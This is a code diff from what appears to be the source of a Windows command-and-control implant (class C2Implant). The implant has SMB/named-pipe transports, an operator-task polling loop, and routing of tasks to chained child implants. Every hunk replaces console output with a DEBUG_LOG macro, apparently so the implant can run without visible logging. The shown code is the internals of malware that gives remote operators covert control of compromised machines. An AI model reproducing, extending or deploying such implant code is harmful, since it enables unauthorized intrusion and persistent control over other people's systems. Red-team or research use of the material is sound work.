@@ -95,6 +95,8 @@ while (true) {
 #include "comms/smb.h"
 #include "comms/queues.h"
 #include "data/uuid7.h"
+#include "debug/debug.h"
+
 // ======================================================================================
 // Global Vars (own file?)
 // ======================================================================================
@@ -159,7 +161,7 @@ void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::
 	PTP_WORK work_item = CreateThreadpoolWork(ChildRouterWorker, ctx, NULL);
 	if (work_item) {
 		SubmitThreadpoolWork(work_item);
-		std::cout << "[+] Task handed to background child router for: " << implant_uuid << std::endl;
+		DEBUG_LOG("[+] Task handed to background child router for: " << implant_uuid);
 	}
 	else {
 		std::cerr << "[-] Failed to create threadpool work for child router." << std::endl;
@@ -361,16 +363,16 @@ void C2Implant::update_transports() {
         */
         //if (h_inbox_ != INVALID_HANDLE_VALUE) {
         //  current_ingress_ = new PipeIngress(h_inbox_);
-        //  std::cout << "[*] INGRESS == pipe!" << std::endl;
+        //  DEBUG_LOG("[*] INGRESS == pipe!");
         //}
         if (h_inbox_ != INVALID_HANDLE_VALUE && h_outbox_ != INVALID_HANDLE_VALUE) {
             // Pass both so Ingress can Write -> Read
             current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
-            std::cout << "[*] INGRESS == pipe!" << std::endl;
+            DEBUG_LOG("[*] INGRESS == pipe!");
         }
 
         else {
-            std::cout << "[!] handle of GET pipe ==  INVALID_HANDLE_VALUE" << std::endl;
+            DEBUG_LOG("[!] handle of GET pipe ==  INVALID_HANDLE_VALUE");
             //check if pipes are registered, if not, check previous handles (close if they are open)
             // and then register both pipes            
             //Only check opposite handle, as the prior if
@@ -386,7 +388,7 @@ void C2Implant::update_transports() {
             }
             //set current ingress to pipe
             current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
-            std::cout << "[*] INGRESS == pipe!" << std::endl;
+            DEBUG_LOG("[*] INGRESS == pipe!");
         }
 
     }
@@ -450,11 +452,11 @@ void C2Implant::update_transports() {
         */
         if (h_outbox_ != INVALID_HANDLE_VALUE) {
             current_egress_ = new PipeEgress(h_outbox_);
-            std::cout << "[*] EGRESS == pipe!" << std::endl;
+            DEBUG_LOG("[*] EGRESS == pipe!");
 
         }
         else {
-            std::cout << "[!] handle of POST pipe ==  INVALID_HANDLE_VALUE" << std::endl;
+            DEBUG_LOG("[!] handle of POST pipe ==  INVALID_HANDLE_VALUE");
             //check if pipes are registered, if not, check previous handles (close if they are open)
             // and then register both pipes.
             //Only check opposite handle, as the prior if
@@ -470,7 +472,7 @@ void C2Implant::update_transports() {
             }
             //set current ingress to pipe
             current_egress_ = new PipeEgress(h_outbox_);
-            std::cout << "[*] EGRESS == pipe!" << std::endl;
+            DEBUG_LOG("[*] EGRESS == pipe!");
         }
 
 
@@ -487,14 +489,14 @@ void C2Implant::cycle() {
 
 	while (true) {
 
-		std::cout << "[*] Start of cycle" << std::endl;
+		DEBUG_LOG("[*] Start of cycle");
 
 		//a quick check, to update the strats, if/when the operator switches strat
 		std::string desired_ingress = SettingsManager::instance().get<std::string>("comms_get_function", "");
 		std::string desired_egress = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
 		if (active_ingress_strat_name != desired_ingress || active_egress_strat_name != desired_egress) {
-			std::cout << "[*] Strategy change detected! Rebuilding transports..." << std::endl;
+			DEBUG_LOG("[*] Strategy change detected! Rebuilding transports...");
 			this->update_transports();
 
 			// Sync our local tracking variables
@@ -572,7 +574,7 @@ void C2Implant::cycle() {
 		//    }
 		//}
 		if (result == WAIT_TIMEOUT) {
-			std::cout << "[*] Poll Based Ingress" << std::endl;
+			DEBUG_LOG("[*] Poll Based Ingress");
 
 			nlohmann::json incoming = current_ingress_->get(implant_uuid_);
 
@@ -604,7 +606,7 @@ void C2Implant::cycle() {
 		TLDR: SMB/handle comms via Implant have  no set sleep time. When it gets data, it acts, as fast or as slow as that is.
 		*/
 		else if (h_in_event != NULL && result == WAIT_OBJECT_0) {
-			std::cout << "[*] Handle Based Ingress" << std::endl;
+			DEBUG_LOG("[*] Handle Based Ingress");
 			nlohmann::json incoming = current_ingress_->get(implant_uuid_);
 
 			handle_tasks(incoming);
@@ -617,7 +619,7 @@ void C2Implant::cycle() {
 		// (literal) signal to send back our data. 
 		// ================================================================================
 		else if (result == WAIT_OBJECT_0 || (h_in_event != NULL && result == WAIT_OBJECT_0 + 1)) {
-			std::cout << "[*] Worker completed, queueing task response" << std::endl;
+			DEBUG_LOG("[*] Worker completed, queueing task response");
 
 			std::lock_guard<std::mutex> lock(PostQueue::mutex);
 			if (!PostQueue::post_queue.empty()) {
@@ -646,18 +648,18 @@ void C2Implant::sleep_implant() {
 //Helper to handle tasks 
 void C2Implant::handle_tasks(const nlohmann::json& incoming) {
 	//debug inbound
-	std::cout << incoming.dump(4) << std::endl;
+	DEBUG_LOG(incoming.dump(4));
 
 	// Handle HTTP 204/40X / Empty Pipes
 	if (incoming.is_null()) {
-		std::cout << "No tasks" << std::endl;
+		DEBUG_LOG("No tasks");
 		return; // Nothing to do, go back to sleep/wait
 	}
 
 
 	// Handle task array
 	if (incoming.is_array()) {
-		std::cout << "Task List recieved" << std::endl;
+		DEBUG_LOG("Task List recieved");
 
 		for (const auto& task : incoming) {
 			// Safety check: Does it have the required routing data?
@@ -670,7 +672,7 @@ void C2Implant::handle_tasks(const nlohmann::json& incoming) {
 				// Otherwise, route it down the chain
 				else {
 					//this may be prone to failure, if this hangs, everything probably hangs
-					std::cout << "[*] Routing task to child asynchronously..." << std::endl;
+					DEBUG_LOG("[*] Routing task to child asynchronously...");
 					dispatch_to_child_router(task, task["implant_uuid"]);
 				}
 			}
